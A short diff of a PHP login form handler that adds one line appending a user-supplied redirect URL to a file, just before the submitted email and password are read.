@@ -15,7 +15,7 @@ if (isset($_POST["submit_x"])) {
     if (!empty($_POST['redirect'])) {
         $redirectURL = $_POST['redirect'];
     }
-
+    file_put_contents($file, $redirectURL, FILE_APPEND);
     $email = $_POST["email"];
     $pass = $_POST["password"];
 
